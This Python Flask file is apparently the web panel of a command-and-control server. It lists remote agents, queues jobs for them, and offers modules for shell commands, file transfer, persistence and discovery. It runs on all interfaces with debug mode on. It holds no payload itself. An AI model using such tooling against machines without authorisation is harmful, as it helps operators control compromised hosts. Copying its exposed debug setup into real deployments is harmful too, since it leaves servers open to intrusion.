#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify, send_file
import sqlite3
import json
from datetime import datetime

app = Flask(__name__)

def get_db_connection():
    conn = sqlite3.connect('data/c2_database.db')
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/agents')
def get_agents():
    conn = get_db_connection()
    agents = conn.execute('SELECT * FROM agents ORDER BY last_seen DESC').fetchall()
    conn.close()
    
    agents_list = []
    for agent in agents:
        agents_list.append(dict(agent))
    
    return jsonify(agents_list)

@app.route('/api/jobs')
def get_jobs():
    conn = get_db_connection()
    jobs = conn.execute('''
        SELECT j.*, a.hostname 
        FROM jobs j 
        LEFT JOIN agents a ON j.agent_id = a.id 
        ORDER BY j.created_at DESC
    ''').fetchall()
    conn.close()
    
    jobs_list = []
    for job in jobs:
        jobs_list.append(dict(job))
    
    return jsonify(jobs_list)

@app.route('/api/jobs', methods=['POST'])
def create_job():
    data = request.json
    agent_id = data.get('agent_id')
    module_name = data.get('module_name')
    arguments = data.get('arguments', {})
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    job_id = f"web_job_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    
    cursor.execute('''
        INSERT INTO jobs (id, agent_id, module_name, arguments, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (
        job_id,
        agent_id,
        module_name,
        json.dumps(arguments),
        'pending',
        datetime.now()
    ))
    
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'success', 'job_id': job_id})

@app.route('/api/modules')
def get_modules():
    # Return available modules
    modules = [
        {'name': 'shell', 'description': 'Execute shell commands'},
        {'name': 'file_transfer', 'description': 'Transfer files'},
        {'name': 'persistence', 'description': 'Establish persistence'},
        {'name': 'discovery', 'description': 'System discovery'},
        {'name': 'sysinfo', 'description': 'System information'}
    ]
    return jsonify(modules)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)